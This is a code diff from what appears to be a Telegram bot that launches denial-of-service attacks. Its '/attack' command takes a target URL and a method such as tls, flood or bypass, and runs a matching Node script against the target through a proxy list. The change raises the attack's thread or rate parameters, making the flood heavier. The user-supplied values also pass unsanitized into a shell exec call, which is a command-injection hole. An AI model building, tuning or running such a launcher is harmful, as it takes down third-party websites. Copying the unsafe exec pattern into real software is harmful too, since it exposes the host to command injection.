@@ -159,7 +159,7 @@ bot.onText(/\/attack (.+) (tls|flood|reflood|kill|bypass) (\d+)/, (msg, match) =
   lastAttackTime = now;
   bot.sendMessage(chatId, `*🔫 Attack sent!*\n\n*URL:* \`${url}\`\n*Method:* \`${method}\`\n*Thời gian:* \`${time}s\``, { parse_mode: "Markdown" });
   const { exec } = require('child_process');
-  exec(`node ${method}.js ${url} ${time} 8 4 proxy.txt`, (error, stdout, stderr) => {
+  exec(`node ${method}.js ${url} ${time} 64 8 proxy.txt`, (error, stdout, stderr) => {
     removeSlot.run(userId, url, method);
     syncSlotsFromDb();
     bot.sendMessage(
